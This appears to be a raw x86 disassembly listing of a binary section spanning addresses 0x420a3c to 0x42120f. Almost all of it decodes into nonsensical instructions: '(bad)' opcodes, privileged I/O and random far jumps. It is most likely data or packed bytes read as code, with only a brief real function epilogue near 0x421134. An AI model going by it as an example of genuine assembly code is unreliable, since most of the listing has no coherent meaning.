  420a3c:	or     edx,DWORD PTR ds:0x146e25b9
  420a42:	xchg   BYTE PTR [ecx-0x5c],dl
  420a45:	push   edx
  420a46:	mov    al,ds:0x18f920e4
  420a4b:	adc    esi,esi
  420a4d:	cmp    al,0x4e
  420a4f:	fidivr DWORD PTR [edi+0x6c]
  420a52:	test   esi,0x2fdc2437
  420a58:	xor    eax,0x68aba1aa
  420a5d:	gs popf 
  420a5f:	loope  0x420ad8
  420a61:	pop    ds
  420a62:	stos   BYTE PTR es:[edi],al
  420a63:	nop
  420a64:	push   es
  420a65:	jae    0x4209e9
  420a67:	or     BYTE PTR [eax-0x1d],al
  420a6a:	push   ebp
  420a6b:	ss dec eax
  420a6d:	sub    eax,DWORD PTR [ecx+0xe12125f]
  420a73:	out    0xd5,al
  420a75:	jg     0x420aaa
  420a77:	aam    0x6b
  420a79:	add    DWORD PTR ds:0x848e3297,esp
  420a7f:	sbb    eax,0xde69e453
  420a84:	mov    al,ds:0x374a8421
  420a89:	inc    ebx
  420a8a:	jge    0x420b09
  420a8c:	(bad)  
  420a8e:	inc    ebp
  420a8f:	mov    ebx,0x694a68a0
  420a94:	ss vcmppd xmm7,xmm6,xmm6,0xda
  420a9a:	out    0xc4,al
  420a9c:	call   0x1b3ba65a
  420aa1:	cmp    ebp,DWORD PTR [edi+0x54]
  420aa4:	mov    ebp,DWORD PTR [eax+0x4536aa3e]
  420aaa:	int    0x59
  420aac:	or     dl,BYTE PTR [ebx]
  420aae:	push   0x256df367
  420ab3:	add    eax,esi
  420ab5:	das    
  420ab6:	xchg   ebx,eax
  420ab7:	pop    esi
  420ab8:	cwde   
  420ab9:	(bad)  
  420aba:	ficomp WORD PTR [eax]
  420abc:	cs dec esp
  420abe:	(bad)  
  420abf:	xor    DWORD PTR [ebx+0x701ba88f],esi
  420ac5:	test   al,0x8d
  420ac7:	std    
  420ac8:	sahf   
  420ac9:	cmp    DWORD PTR [eax+0x674b6b64],ebp
  420acf:	loop   0x420b00
  420ad1:	pop    eax
  420ad2:	rol    DWORD PTR [ecx-0x2b0b25ea],cl
  420ad8:	fcomp  DWORD PTR [edi]
  420ada:	mov    eax,0x715e6870
  420adf:	and    DWORD PTR [edi-0x35e32540],ebx
  420ae5:	jae    0x420b45
  420ae7:	fwait
  420ae8:	mov    ds:0x6d2c2706,eax
  420aed:	stos   BYTE PTR es:[edi],al
  420aee:	cmp    al,0xdd
  420af0:	mov    eax,ds:0x87b9c173
  420af5:	xchg   esi,eax
  420af6:	sub    ecx,DWORD PTR [eax+0x2d43478d]
  420afc:	neg    DWORD PTR [edx+esi*8]
  420aff:	mov    dl,bl
  420b01:	xor    BYTE PTR [edx-0x7d],dh
  420b04:	sub    al,0x1c
  420b07:	add    al,0x51
  420b09:	sbb    al,0x44
  420b0b:	or     DWORD PTR [ebx],edi
  420b0d:	dec    eax
  420b0e:	retf   0xec7e
  420b11:	mov    BYTE PTR [eax+ebx*4+0xa],cl
  420b15:	xchg   edi,eax
  420b16:	sbb    eax,0x4d44a70a
  420b1b:	out    0xbf,al
  420b1d:	push   esp
  420b1e:	(bad)  
  420b1f:	icebp  
  420b20:	sbb    al,0x57
  420b22:	xchg   ecx,eax
  420b23:	lds    eax,FWORD PTR [edx+0x69fd6ac5]
  420b29:	imul   esp,DWORD PTR [edi],0x66
  420b2c:	js     0x420aef
  420b2e:	jns    0x420b4a
  420b30:	and    DWORD PTR [ebp-0x4a4b8a83],esi
  420b36:	loope  0x420b5c
  420b38:	mov    ebp,0x3004af46
  420b3d:	push   ds
  420b3e:	push   edi
  420b3f:	inc    eax
  420b40:	ret    0xe47d
  420b43:	mov    al,ds:0xcf08983c
  420b48:	inc    esp
  420b49:	cmc    
  420b4a:	in     eax,0x84
  420b4c:	mov    ds:0xf5031654,eax
  420b51:	xchg   ecx,eax
  420b52:	call   0xa828:0x51991db3
  420b59:	(bad)  
  420b5a:	loop   0x420b99
  420b5c:	add    edi,DWORD PTR [edx]
  420b5e:	add    esp,ebp
  420b60:	cmovb  ecx,esp
  420b63:	call   0x67a5:0x70781f1
  420b6a:	xor    al,0x39
  420b6c:	repnz and al,0x44
  420b6f:	int    0x3e
  420b71:	pusha  
  420b72:	xchg   edi,eax
  420b73:	pop    edx
  420b74:	push   edi
  420b75:	push   eax
  420b76:	sahf   
  420b77:	call   0x5802:0x3b6ea23a
  420b7e:	sbb    eax,0x4849a180
  420b83:	mov    cx,0xd004
  420b87:	enter  0x3a14,0xe
  420b8b:	pop    edx
  420b8c:	(bad)  
  420b8d:	(bad)  
  420b8f:	dec    BYTE PTR [ecx-0x4346405a]
  420b95:	adc    BYTE PTR [edx+0x55],ch
  420b98:	mov    esi,0x84d5b919
  420b9d:	aas    
  420b9e:	ds (bad) 
  420ba0:	retf   0xed7
  420ba3:	sub    cl,dl
  420ba5:	ret    
  420ba6:	test   DWORD PTR [esi-0x26],esi
  420ba9:	(bad)  
  420baa:	rep outs dx,DWORD PTR ds:[esi]
  420bac:	lahf   
  420bad:	(bad)  
  420bae:	jmp    0xb8d:0x2a5b7e98
  420bb5:	and    eax,0xb2d5f33a
  420bba:	dec    ebp
  420bbb:	sbb    BYTE PTR [edi+0x7eddcc7e],0xde
  420bc2:	les    ebx,FWORD PTR [esi+0x7820584f]
  420bc8:	not    DWORD PTR [eax-0x6f]
  420bcb:	nop
  420bcc:	push   0x6a480910
  420bd1:	les    ebx,FWORD PTR [ebx-0x5c]
  420bd4:	int3   
  420bd5:	mov    ds,ebp
  420bd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420bd8:	fiadd  DWORD PTR [ebx+0x18]
  420bdb:	push   es
  420bdc:	scas   al,BYTE PTR es:[edi]
  420bdd:	popf   
  420bde:	jmp    0x2e05:0x2c8335bc
  420be5:	lods   al,BYTE PTR ds:[esi]
  420be6:	leave  
  420be7:	add    al,0xcc
  420be9:	(bad)  
  420bea:	dec    edx
  420beb:	hlt    
  420bec:	rcl    DWORD PTR [esi],cl
  420bee:	mov    cl,0x7e
  420bf0:	xchg   ebx,eax
  420bf1:	nop
  420bf2:	and    al,0x32
  420bf4:	sub    al,0xea
  420bf6:	push   ecx
  420bf7:	sahf   
  420bf8:	sub    bl,BYTE PTR [edi+edx*4-0x1a]
  420bfc:	add    BYTE PTR ds:0x7872bd8a,dh
  420c02:	sub    al,bl
  420c04:	mov    ebp,0xa5359a2d
  420c09:	pop    esp
  420c0a:	repz repnz push ebp
  420c0d:	cmp    al,0xa1
  420c0f:	pusha  
  420c10:	add    DWORD PTR [edi],0x3f
  420c13:	or     dl,BYTE PTR [edx+0x2a]
  420c16:	loop   0x420c1c
  420c18:	push   edx
  420c19:	out    0xe9,eax
  420c1b:	push   ecx
  420c1c:	push   edi
  420c1d:	xchg   ah,ch
  420c1f:	rol    DWORD PTR [esi+0x164954b],1
  420c25:	adc    ebx,esp
  420c27:	cmc    
  420c28:	ret    
  420c29:	lods   eax,DWORD PTR ds:[esi]
  420c2a:	call   0xfc73272d
  420c2f:	sbb    BYTE PTR [edi-0x24],ah
  420c32:	mov    edx,0xf769dafb
  420c37:	mov    esp,0x4c5d61cb
  420c3c:	mov    edx,0x8e21af2c
  420c41:	mov    ebx,0x2ca39799
  420c46:	hlt    
  420c47:	mov    cl,0x3e
  420c49:	data16 and al,0x4c
  420c4c:	fstp   DWORD PTR [ebx+ebp*4]
  420c4f:	addr16 out dx,al
  420c51:	push   ebx
  420c52:	adc    ecx,DWORD PTR [ecx]
  420c54:	push   cs
  420c55:	xor    eax,0x3a3c9d54
  420c5a:	repnz in al,dx
  420c5c:	cmp    esi,0x14a7802e
  420c62:	dec    BYTE PTR [ecx-0x72]
  420c65:	shl    DWORD PTR [edi],0x15
  420c68:	arpl   WORD PTR [ecx+0x48],ax
  420c6b:	in     al,dx
  420c6c:	and    BYTE PTR [edi-0x2a594ade],ah
  420c72:	inc    edi
  420c73:	sbb    DWORD PTR [edx+0x1e3a3862],ecx
  420c79:	mov    bl,0x39
  420c7b:	cmp    BYTE PTR [edi+0x2a],dl
  420c7e:	std    
  420c7f:	or     DWORD PTR [ebp-0x438b563f],edx
  420c85:	out    0xba,al
  420c87:	push   cs
  420c88:	out    dx,al
  420c89:	adc    ch,BYTE PTR [eax+0x40]
  420c8c:	add    ecx,edx
  420c8e:	and    al,BYTE PTR [edi+0x49]
  420c91:	fistp  WORD PTR [ebx]
  420c93:	push   0x29
  420c95:	jbe    0x420cee
  420c97:	pop    ecx
  420c98:	rcr    BYTE PTR [edx],0xbd
  420c9b:	retf   
  420c9c:	xchg   ecx,eax
  420c9d:	pop    edi
  420c9e:	pusha  
  420c9f:	pop    esp
  420ca0:	outs   dx,DWORD PTR ds:[esi]
  420ca1:	sbb    al,bh
  420ca3:	mov    ds:0x645a7f57,al
  420ca8:	dec    esi
  420ca9:	inc    esp
  420caa:	sbb    ch,BYTE PTR [esi+edx*1]
  420cad:	cs mov cl,bl
  420cb0:	inc    ebp
  420cb1:	xchg   eax,ecx
  420cb3:	fld    TBYTE PTR [esi*2-0x675fcf2f]
  420cba:	stos   DWORD PTR es:[edi],eax
  420cbb:	popa   
  420cbc:	pop    ecx
  420cbd:	mov    ebp,0x22bfffde
  420cc2:	cmp    ch,bl
  420cc4:	push   esp
  420cc5:	cld    
  420cc6:	push   eax
  420cc7:	adc    BYTE PTR [ecx-0x65],cl
  420cca:	lds    esi,FWORD PTR [edx+0x7622ce7]
  420cd0:	shl    DWORD PTR [esi-0x4],1
  420cd3:	push   edi
  420cd4:	or     DWORD PTR [edi],eax
  420cd6:	add    BYTE PTR [ecx+0xa],al
  420cd9:	pop    ss
  420cda:	sbb    DWORD PTR [ebx-0x72028d2e],ebp
  420ce0:	pop    es
  420ce1:	xor    ebp,0xffffffc3
  420ce4:	cdq    
  420ce5:	stos   DWORD PTR es:[edi],eax
  420ce6:	sub    eax,0x252a8728
  420ceb:	sub    eax,0x7c1c41a4
  420cf0:	int    0xda
  420cf2:	imul   esp,edx,0xabbf0f49
  420cf8:	mov    eax,0xde6f526b
  420cfd:	sub    al,0xb
  420d00:	inc    ecx
  420d01:	adc    ebx,0x15
  420d04:	mov    edi,0xe303ccad
  420d09:	frstpm(287 only) 
  420d0b:	xor    al,0x6d
  420d0d:	pusha  
  420d0e:	mov    esp,0x2d3b2202
  420d13:	test   al,0x5d
  420d15:	push   0xc4adc42
  420d1a:	jmp    0x420cfd
  420d1c:	pop    ds
  420d1d:	sub    ah,BYTE PTR [ebx+0x5a5ec20b]
  420d23:	fs icebp 
  420d25:	mov    al,0xa2
  420d27:	repnz cdq 
  420d29:	scas   eax,DWORD PTR es:[edi]
  420d2a:	xchg   ebx,eax
  420d2b:	inc    ebp
  420d2c:	dec    esi
  420d2d:	fsub   QWORD PTR [ebx]
  420d2f:	mov    eax,ds:0xded96236
  420d34:	jle    0x420d83
  420d36:	or     edx,DWORD PTR [edi-0x3c]
  420d39:	adc    DWORD PTR [esi+ecx*8],0xffffff92
  420d3d:	mov    eax,0xc44a03b8
  420d42:	cdq    
  420d43:	cli    
  420d44:	add    bh,BYTE PTR [edi]
  420d46:	sbb    edi,ecx
  420d48:	in     al,0xbe
  420d4a:	iret   
  420d4b:	retf   0x406d
  420d4e:	or     BYTE PTR [eax],dh
  420d50:	cmp    ah,BYTE PTR [ebp-0x7b16a578]
  420d56:	ja     0x420d48
  420d58:	call   0x87a3bd14
  420d5d:	cmp    eax,0x3961cd31
  420d62:	mov    dl,0x4c
  420d64:	lods   eax,DWORD PTR ds:[esi]
  420d65:	mov    edx,0x7080883c
  420d6a:	mov    ds:0xdebf7c7b,al
  420d6f:	shr    BYTE PTR [eax+edx*8-0x73],cl
  420d73:	push   ebp
  420d74:	or     DWORD PTR [eax-0xf],edi
  420d77:	and    DWORD PTR [ebp-0x7d98ba08],edi
  420d7d:	and    esp,edx
  420d7f:	cmp    BYTE PTR [ebx],ah
  420d81:	push   edx
  420d82:	popf   
  420d83:	push   esp
  420d84:	jbe    0x420da0
  420d86:	int    0x9d
  420d88:	xor    ebx,DWORD PTR [ebp-0x61]
  420d8b:	dec    ebp
  420d8c:	and    eax,0x91f5d9c8
  420d91:	test   al,0x55
  420d93:	stos   DWORD PTR es:[edi],eax
  420d94:	aam    0x2
  420d96:	xlat   BYTE PTR ds:[ebx]
  420d97:	test   BYTE PTR [edi+0x64b93891],cl
  420d9d:	stos   DWORD PTR es:[edi],eax
  420d9e:	mov    al,ds:0xb64848d5
  420da3:	add    eax,0x337d07c1
  420da8:	push   es
  420da9:	repz (bad) 
  420dab:	data16 jecxz 0x420d72
  420dae:	(bad)  
  420daf:	lock mov ecx,es
  420db2:	add    cl,cl
  420db4:	xchg   esp,eax
  420db5:	adc    eax,0x78fd73d8
  420dba:	retw   0xefe4
  420dbe:	xor    DWORD PTR [ecx-0x2891adc],0x1167a673
  420dc8:	xor    esp,DWORD PTR [edi-0x46]
  420dcb:	pop    ss
  420dcc:	or     edx,ebx
  420dce:	inc    ecx
  420dcf:	ror    BYTE PTR [eax],1
  420dd1:	test   DWORD PTR [edi],esi
  420dd3:	cdq    
  420dd4:	cmc    
  420dd5:	(bad)  
  420dd6:	repz (bad) 
  420dd8:	pop    ebx
  420dd9:	fistp  DWORD PTR [ecx-0x15]
  420ddc:	dec    esi
  420ddd:	popa   
  420dde:	jg     0x420dcf
  420de0:	mov    dl,0x29
  420de2:	fst    st(4)
  420de4:	bound  ecx,QWORD PTR [esi-0x4dfc58a3]
  420dea:	into   
  420deb:	lds    edi,FWORD PTR [ebp+0x71]
  420dee:	or     ebx,DWORD PTR [edi]
  420df0:	jmp    0x420e46
  420df2:	out    dx,eax
  420df3:	retf   
  420df4:	ret    
  420df5:	xor    eax,0xd813a4b0
  420dfa:	out    dx,eax
  420dfb:	leave  
  420dfc:	ins    BYTE PTR es:[edi],dx
  420dfd:	idiv   DWORD PTR [ebx]
  420dff:	xor    ch,BYTE PTR [edi]
  420e01:	in     al,dx
  420e02:	dec    ebx
  420e03:	mov    ecx,0x9979a4a9
  420e08:	fnstcw WORD PTR [esi]
  420e0a:	ja     0x420e4d
  420e0c:	jmp    0xa36e3e2c
  420e11:	cmp    eax,0x11a12186
  420e16:	push   ss
  420e17:	cld    
  420e18:	pop    es
  420e19:	push   esp
  420e1a:	arpl   WORD PTR [edx+0x39df70e9],cx
  420e20:	mov    ebx,0xeccd4039
  420e25:	shl    BYTE PTR [esi-0x464e06e],0x7e
  420e2c:	dec    bl
  420e2e:	cmp    ebx,DWORD PTR [ebp+0x687b6576]
  420e34:	enter  0x7355,0x48
  420e38:	test   BYTE PTR [eax],ch
  420e3a:	aam    0x96
  420e3c:	scas   al,BYTE PTR es:[edi]
  420e3d:	repz sbb ecx,eax
  420e40:	jle    0x420e61
  420e42:	mov    edx,0x6476719
  420e47:	sub    BYTE PTR [esi],al
  420e49:	mov    al,0x2e
  420e4b:	std    
  420e4c:	fs inc edx
  420e4e:	scas   al,BYTE PTR es:[edi]
  420e4f:	repz xchg edi,eax
  420e51:	test   DWORD PTR ds:0xa4fb47d0,esp
  420e57:	stc    
  420e58:	mov    cl,0xa8
  420e5a:	jmp    0x420e1d
  420e5c:	(bad)  
  420e5d:	sahf   
  420e5e:	and    cl,BYTE PTR [edx+0x53]
  420e61:	mov    ds:0x27e8ee1e,eax
  420e66:	(bad)  
  420e68:	cmp    al,0xe6
  420e6a:	mov    edi,0xd6a5a273
  420e6f:	scas   eax,DWORD PTR es:[edi]
  420e70:	es mov eax,0x52b5746
  420e76:	adc    edi,DWORD PTR [ebp-0x5]
  420e79:	xor    DWORD PTR [ebx+0x11],eax
  420e7c:	in     eax,dx
  420e7d:	mov    ah,0x58
  420e7f:	push   cs
  420e80:	mov    bl,0x4b
  420e82:	bound  eax,QWORD PTR [eax-0x5f]
  420e85:	ret    
  420e86:	push   eax
  420e87:	push   esi
  420e88:	xchg   esi,eax
  420e89:	add    bh,BYTE PTR [eax+ecx*4+0x5da5e48f]
  420e90:	mov    eax,ds:0xa5953489
  420e95:	inc    eax
  420e96:	pop    ss
  420e97:	pop    esi
  420e98:	sub    ebx,DWORD PTR [ecx-0x65]
  420e9b:	pop    esp
  420e9c:	push   eax
  420e9d:	mov    BYTE PTR [ebx],ah
  420e9f:	test   eax,0x648f66ad
  420ea4:	mov    bh,0xa3
  420ea6:	dec    edi
  420ea7:	outs   dx,BYTE PTR ds:[esi]
  420ea8:	test   BYTE PTR [ebx+0x616d0191],dl
  420eae:	lods   eax,DWORD PTR ds:[esi]
  420eaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420eb0:	rcl    BYTE PTR [ecx-0x211f8dbd],1
  420eb6:	arpl   bp,sp
  420eb8:	jae    0x420e7a
  420eba:	(bad)  
  420ebb:	in     eax,dx
  420ebc:	inc    esi
  420ebd:	add    BYTE PTR [ecx-0x54],0xfb
  420ec1:	(bad)
  420ec5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ec6:	pop    edx
  420ec7:	and    al,0xd2
  420ec9:	xchg   BYTE PTR [esi],ah
  420ecb:	or     al,0x53
  420ecd:	mov    ebx,0x20c73a11
  420ed2:	popa   
  420ed3:	loopne 0x420ed3
  420ed5:	das    
  420ed6:	out    dx,eax
  420ed7:	imul   eax,DWORD PTR [ecx+0x4c106ecc],0x1c
  420ede:	retf   0x16b8
  420ee1:	bound  eax,QWORD PTR [edx+0x66b4f7e4]
  420ee7:	into   
  420ee8:	add    eax,DWORD PTR [edx-0x6e]
  420eeb:	pop    edx
  420eec:	fisubr DWORD PTR [edi+0x5]
  420eef:	pop    ss
  420ef0:	dec    eax
  420ef1:	jge    0x420ecf
  420ef3:	hlt    
  420ef4:	(bad)  
  420ef5:	mov    dh,BYTE PTR [esi]
  420ef7:	jne    0x420f01
  420ef9:	mov    ?,WORD PTR [ebx]
  420efb:	dec    esi
  420efc:	mov    al,ds:0x905424a9
  420f01:	int3   
  420f02:	jb     0x420f66
  420f04:	out    dx,al
  420f05:	push   ss
  420f06:	out    0x7a,al
  420f08:	dec    ebp
  420f09:	shl    BYTE PTR [eax],0x95
  420f0c:	bound  edi,QWORD PTR [edi-0x41]
  420f0f:	or     ah,al
  420f11:	cmp    bl,BYTE PTR [edx+0x12]
  420f14:	aam    0x47
  420f16:	inc    eax
  420f17:	popf   
  420f18:	loopne 0x420f33
  420f1a:	outs   dx,DWORD PTR ds:[esi]
  420f1b:	add    al,BYTE PTR [ecx+0x3fbf6674]
  420f21:	ins    DWORD PTR es:[edi],dx
  420f22:	xchg   ecx,eax
  420f23:	xchg   DWORD PTR [ebx+esi*8+0x72],ecx
  420f27:	mov    cl,0x79
  420f29:	mov    ch,0x36
  420f2b:	pop    edx
  420f2c:	pop    edi
  420f2d:	fiadd  WORD PTR [esi+ecx*2]
  420f30:	push   ds
  420f31:	aas    
  420f32:	in     eax,dx
  420f33:	aad    0xd5
  420f35:	in     eax,0x56
  420f37:	call   0xa870:0x5265a11b
  420f3e:	and    DWORD PTR [edx-0x66],ebp
  420f41:	imul   esi,DWORD PTR [edi-0x1d],0x829ec388
  420f48:	cld    
  420f49:	icebp  
  420f4a:	xor    ecx,DWORD PTR [edx-0x28dcfa97]
  420f50:	scas   eax,DWORD PTR es:[edi]
  420f51:	fadd   DWORD PTR [edx-0x7f]
  420f54:	push   es
  420f55:	xchg   edx,eax
  420f56:	ja     0x420f9d
  420f58:	dec    edi
  420f59:	or     BYTE PTR [edi+0x6ded7f96],bl
  420f5f:	and    BYTE PTR [ebp+0x6f],0x6e
  420f63:	mov    esp,0xdb126d6b
  420f68:	mov    ecx,DWORD PTR [ecx]
  420f6a:	adc    esp,esp
  420f6c:	dec    ecx
  420f6d:	int3   
  420f6e:	adc    BYTE PTR [esp+esi*4-0x59],ch
  420f72:	push   edx
  420f73:	and    DWORD PTR [edi],edi
  420f75:	jle    0x420f0c
  420f77:	je     0x420f66
  420f79:	dec    edi
  420f7a:	test   BYTE PTR [edx],ch
  420f7c:	into   
  420f7d:	arpl   WORD PTR [eax+0x3ab7a687],di
  420f83:	adc    eax,0xea7a51d
  420f88:	fxch   st(2)
  420f8a:	xor    edx,DWORD PTR [eax]
  420f8c:	pushf  
  420f8d:	add    di,WORD PTR [ebx]
  420f90:	xlat   BYTE PTR ds:[ebx]
  420f91:	dec    esp
  420f92:	lods   al,BYTE PTR ds:[esi]
  420f93:	call   0x869d:0x99bb4822
  420f9a:	ja     0x420f25
  420f9c:	cwde   
  420f9d:	push   ebx
  420f9e:	into   
  420f9f:	push   es
  420fa0:	add    al,0x4
  420fa2:	jecxz  0x420f8f
  420fa4:	xchg   ebp,eax
  420fa5:	inc    ecx
  420fa6:	mov    ebx,0x86ab0b04
  420fab:	fist   WORD PTR [eax+0x6d]
  420fae:	scas   eax,DWORD PTR es:[edi]
  420faf:	jb     0x420f7c
  420fb1:	jns    0x420f42
  420fb3:	inc    ecx
  420fb4:	aas    
  420fb5:	addr16 add ecx,0x9a696a62
  420fbc:	dec    ecx
  420fbd:	push   esi
  420fbe:	sub    BYTE PTR [esi+0x13d41a22],dl
  420fc4:	dec    ebp
  420fc5:	push   es
  420fc6:	loope  0x420fed
  420fc8:	addr16 je 0x420f8f
  420fcb:	outs   dx,DWORD PTR ds:[esi]
  420fcc:	jmp    0x7759:0x7ea0b1d3
  420fd3:	mov    ecx,0x27d0908e
  420fd8:	jp     0x421053
  420fda:	imul   esp,DWORD PTR [edi-0x3e],0xffffff8f
  420fde:	fwait
  420fdf:	popf   
  420fe0:	stos   BYTE PTR es:[edi],al
  420fe1:	inc    edx
  420fe2:	or     BYTE PTR [ebx-0x2a],dh
  420fe5:	push   ecx
  420fe6:	xchg   edi,eax
  420fe7:	aam    0x9a
  420fe9:	fcom   DWORD PTR [esi]
  420feb:	jb     0x42103e
  420fed:	and    al,0xce
  420fef:	loop   0x421012
  420ff1:	or     BYTE PTR [ebx],bh
  420ff3:	push   edi
  420ff4:	shr    BYTE PTR [edx+0x797d1dde],0xed
  420ffb:	cli    
  420ffc:	and    al,0x8d
  420ffe:	adc    DWORD PTR ds:[eax+0x1363c7d4],edx
  421005:	xchg   edx,eax
  421006:	lods   al,BYTE PTR ds:[esi]
  421007:	or     BYTE PTR [ebp+0xaf792c7],ch
  42100d:	add    dh,BYTE PTR [edi-0x3e3740ed]
  421013:	dec    esp
  421014:	int    0x63
  421016:	push   ebx
  421017:	push   edx
  421018:	xor    eax,esp
  42101a:	sub    edx,DWORD PTR [eax+0x32098241]
  421020:	test   edi,edx
  421022:	push   esi
  421023:	je     0x421022
  421025:	into   
  421026:	add    esp,ebp
  421028:	loopne 0x420fbb
  42102a:	dec    ebx
  42102b:	pop    esi
  42102c:	and    BYTE PTR [ebp-0x3d773795],ch
  421032:	or     ebp,ecx
  421034:	sti    
  421035:	ins    DWORD PTR es:[edi],dx
  421036:	dec    edx
  421037:	fs aam 0xa9
  42103a:	push   0x75
  42103c:	mov    ds:0x536c9403,al
  421041:	cmp    DWORD PTR [esi-0x6e],0xb9c7bb96
  421048:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421049:	inc    ecx
  42104a:	push   ebp
  42104b:	loop   0x421097
  42104d:	or     eax,0xab2ac4cb
  421052:	cmp    BYTE PTR [ebx],dl
  421054:	add    edx,DWORD PTR ds:0x26b6d281
  42105a:	dec    edx
  42105b:	ss mov ds,eax
  42105e:	mov    ds:0x759c488d,al
  421063:	outs   dx,DWORD PTR ds:[esi]
  421064:	inc    eax
  421065:	fisubr WORD PTR [bx]
  421068:	inc    eax
  421069:	and    DWORD PTR [edi-0x20],esi
  42106c:	popf   
  42106d:	sti    
  42106e:	push   edi
  42106f:	fisubr WORD PTR [esi-0x6e]
  421072:	mov    dh,0xfe
  421074:	test   BYTE PTR [eax+esi*8+0x59],ch
  421078:	lods   eax,DWORD PTR ds:[esi]
  421079:	mov    esi,0xeca9c9e
  42107e:	fnstcw WORD PTR [bp+si-0x13]
  421082:	or     BYTE PTR [edx-0x1a],ch
  421085:	mov    ds:0x493aa88b,al
  42108a:	fmul   st,st(6)
  42108c:	mov    bl,0xcc
  42108e:	ss retf 
  421090:	cmp    ebx,DWORD PTR ds:[edi+0x62]
  421094:	or     bh,BYTE PTR [ecx+0x67]
  421097:	out    dx,eax
  421098:	sbb    eax,0x94e6b09b
  42109d:	pop    edi
  42109e:	dec    esi
  42109f:	(bad)  
  4210a0:	mov    al,0xa9
  4210a2:	lods   al,BYTE PTR ds:[esi]
  4210a3:	lea    eax,[edi-0x4df88c2d]
  4210a9:	es push ecx
  4210ab:	daa    
  4210ac:	es jnp 0x4210e5
  4210af:	sbb    dh,ah
  4210b1:	fiadd  DWORD PTR [edi-0x1ca0123]
  4210b7:	call   0x7b86b5e7
  4210bc:	fs leave 
  4210be:	jge    0x421069
  4210c0:	setb   BYTE PTR [eax+0x266412c6]
  4210c7:	iret   
  4210c8:	sub    ebx,DWORD PTR [eax+0x58]
  4210cb:	jle    0x4210db
  4210cd:	add    eax,0x96ca69f5
  4210d2:	xchg   esi,eax
  4210d3:	popa   
  4210d4:	imul   edx,DWORD PTR [ebx-0x54d2697e],0xffffffb4
  4210db:	test   BYTE PTR [esi+eax*4+0x3d27aafb],0x53
  4210e3:	jae    0x4210e1
  4210e5:	jge    0x4210ff
  4210e7:	adc    ah,dl
  4210e9:	or     al,0x6a
  4210eb:	inc    ebp
  4210ec:	mov    DWORD PTR [esi],ebp
  4210ee:	and    al,0x54
  4210f0:	hlt    
  4210f1:	dec    bp
  4210f3:	lods   eax,DWORD PTR ds:[esi]
  4210f4:	aad    0x90
  4210f6:	push   es
  4210f7:	call   0xb9050574
  4210fc:	mov    edi,0x6255174f
  421101:	mov    cl,0xa6
  421103:	dec    eax
  421104:	out    dx,eax
  421105:	mov    dl,0x68
  421107:	imul   ebx,DWORD PTR [ecx-0x62],0x40a63547
  42110e:	imul   esi,DWORD PTR [esi-0x79cb255a],0x69f75821
  421118:	popa   
  421119:	imul   edi,esp,0x1e
  42111c:	add    BYTE PTR [ebx+0x48],bh
  42111f:	sub    esi,DWORD PTR [eax]
  421121:	jns    0x421119
  421123:	mov    esi,0xf902823
  421128:	xchg   edx,eax
  421129:	xor    eax,0x4cf8afb3
  42112e:	jmp    0xf334b5e2
  421133:	stos   BYTE PTR es:[edi],al
  421134:	mov    edi,DWORD PTR [ecx]
  421136:	add    edx,edi
  421138:	mov    DWORD PTR [ecx],edx
  42113a:	mov    ecx,DWORD PTR [ebp+0x8]
  42113d:	xor    ecx,eax
  42113f:	add    ecx,esi
  421141:	jne    0x41ed92
  421147:	mov    ecx,DWORD PTR [ebp-0x8]
  42114a:	xor    ecx,eax
  42114c:	mov    eax,DWORD PTR [ebp+0x10]
  42114f:	add    ecx,esi
  421151:	mov    DWORD PTR [eax],ecx
  421153:	pop    edi
  421154:	pop    esi
  421155:	pop    ebx
  421156:	leave  
  421157:	ret    0xc
  42115a:	pop    ss
  42115b:	or     al,0x84
  42115d:	repz lahf 
  42115f:	sti    
  421160:	ja     0x42114e
  421162:	stos   BYTE PTR es:[edi],al
  421163:	mov    edx,0x43e288e2
  421168:	jmp    0x4211ae
  42116a:	cmp    eax,0x610001cc
  42116f:	add    BYTE PTR [eax],al
  421171:	add    BYTE PTR [ebp-0x4c501d33],dl
  421177:	in     eax,dx
  421178:	adc    al,0xcd
  42117a:	adc    BYTE PTR [esi-0x66],dl
  42117d:	adc    DWORD PTR [eax+edi*2-0x18d64158],ebp
  421184:	mov    al,0x24
  421186:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421187:	stos   BYTE PTR es:[edi],al
  421188:	inc    eax
  421189:	fiadd  DWORD PTR [eax-0x61bbb446]
  42118f:	mov    dh,0x37
  421191:	lahf   
  421192:	adc    DWORD PTR [edi+0xbd0a7dc],esi
  421198:	mov    ebp,0x54f8a941
  42119d:	popf   
  42119e:	push   cs
  42119f:	jle    0x421169
  4211a1:	aam    0xea
  4211a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211a4:	mov    ebp,0x2f2891b
  4211a9:	mov    BYTE PTR [esi-0x36b8e9d6],bl
  4211af:	or     eax,0x856f1756
  4211b4:	fwait
  4211b5:	pop    ebp
  4211b6:	mov    dl,0x15
  4211b8:	leave  
  4211b9:	mov    edi,0xdddc7c0c
  4211be:	mov    ds:0xc687dda3,al
  4211c3:	cli    
  4211c4:	cdq    
  4211c5:	mov    ds:0x3df1fa3f,eax
  4211ca:	repnz sahf 
  4211cc:	xchg   BYTE PTR [edi],cl
  4211ce:	push   ds
  4211cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211d0:	pop    edx
  4211d1:	adc    al,0x3
  4211d3:	add    BYTE PTR [eax],al
  4211d5:	add    BYTE PTR [eax],al
  4211d7:	add    BYTE PTR [eax],al
  4211d9:	add    cl,dl
  4211db:	sub    al,0x14
  4211dd:	adc    edi,ebp
  4211df:	cmp    edx,edi
  4211e1:	out    dx,al
  4211e2:	pop    edi
  4211e3:	xchg   bx,ax
  4211e5:	push   0xb9b79029
  4211ea:	sahf   
  4211eb:	int3   
  4211ec:	add    DWORD PTR [eax],eax
  4211ee:	popa   
  4211ef:	add    BYTE PTR [eax],al
  4211f1:	add    BYTE PTR [ebx],dh
  4211f3:	pop    eax
  4211f4:	jp     0x421266
  4211f6:	test   eax,0x66fa8787
  4211fb:	ja     0x4211af
  4211fd:	outs   dx,DWORD PTR es:[esi]
  4211ff:	out    dx,al
  421200:	test   al,0xc4
  421202:	adc    ebp,ebx
  421204:	sar    DWORD PTR [eax+0x59],1
  421207:	ja     0x4211fc
  421209:	mov    WORD PTR [edx-0x2996ae24],?
  42120f:	sbb    al,0x4d
